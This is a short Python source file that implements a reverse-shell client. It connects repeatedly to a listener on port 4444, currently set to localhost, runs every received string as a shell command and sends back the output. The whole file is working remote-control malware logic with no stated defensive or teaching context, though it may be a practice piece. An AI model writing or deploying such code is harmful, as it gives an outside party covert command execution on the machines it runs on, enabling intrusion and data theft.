import socket
import subprocess


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.host, self.port))

    def send(self: isinstance, data: bytes):
        self.client.send(data)

    def receive(self):
        return self.client.recv(6000)


client = None
def connect():
    global client
    while client is None:
        try:
            client = Client("localhost", 4444)
        except Exception:
            pass


connect()

while True:
    try:
        command = client.receive().decode()
        if command is None:
            continue
        output = subprocess.run(
            command,
            shell=True,
            text=True,
            capture_output=True,
        )
        output = output.stderr if output.stderr else output.stdout

        if output is None or output == "":
            output = "Command executed successfully"

        client.send(output.encode())
    except Exception:
        client = None
        connect()
        
